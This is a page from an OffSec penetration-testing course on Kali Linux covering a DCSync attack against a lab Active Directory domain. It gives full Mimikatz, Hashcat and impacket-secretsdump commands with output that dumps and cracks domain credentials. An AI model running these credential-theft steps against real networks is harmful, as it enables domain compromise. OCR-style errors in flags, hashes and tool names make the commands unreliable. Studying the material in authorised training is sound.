# OffSec

Penetration Testing with Kali Linux

Nice Mimikatz performs the dcsync attack by impersonating a domain controller and obtained the user credentials by using replication.

Now, let's copy the NTLM hash and store it in a file named hashes.dcsync on our Kali system. We can then track the hash using Hashcat as we learned in the Password Attacks Mode. We'll enter 1000 as mode, rockyou.txt as wordlist, and best64.rule as file rule. After entering the file containing the NTLM hash and --force, we run Hashcat in a VM.

```
kali@kali:~ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r
/usr/share/hashcat/best64.rule --force
```

```
08d74a6f9b6b971bbae4187747494:Flowers1
```

> Listing 822 - Using Mimikatz to crack the NTLM hash obtained by the dcsync attack

Listing 822 shows that we successfully retrieved the plaintext password of dave.

We can obtain the NTLM hash of any user account of the domain corp. Furthermore, we can attempt to crack these hashes and retrieve the plaintext passwords of these accounts.

Notably, we perform the dcsync attack to obtain any user password of the domain, even the domain administrator account.

```
mimikatz # lsdump:dcsync /user:corp\Administrator
Credentials:
Hash NTLM: 289d2c6cf8d4d7a7e2eb3b9f05c425
```

> Listing 823 - Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator
Administrator

We'll discuss lateral movement vectors by leveraging NTLM hashes obtained by dcsync in the Module Lateral Movement in Active Directory.

For now, let's perform the dcsync attack from Linux. We'll use impacket-secretsdump to achieve this. We'll target the username dave as an argument for -just-do-dc and provide the credentials of a user with the required rights, which is the IP of the domain controller in the format: domain/user:password@ip__

```
kali@kali:~ impacket-secretsdump -just-do-dc
corp.com/jeffadmin:BrouhauitangPerorateBoom2023@'192.168.50.70
Impacket v0.10.0 - Copyright 2022 Secure Corporation
```

+   * Dumping Domain Credentials (domain\uid:hash)
* Using the DPI method to get NTDS.dit
deave:103:aaa3b4b3b5b1400eeaad3b4b35b1400ee:08d74a6f9b6b971bbae4187747494::
* Kerberos hashes grabbed
dave:a25ec128-ctm-hash-96:f9489e5e94af170fd334cf74563d72b126
dave:aes128-ctm-hash-sha256:970c5b1389
dave:des-cbc-md5:1a3294b4a3b8fa215
* Cleaning up...
* Listing 824 - Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave

PWK - © 2023 OffSec Services Limited. All rights reserved.

775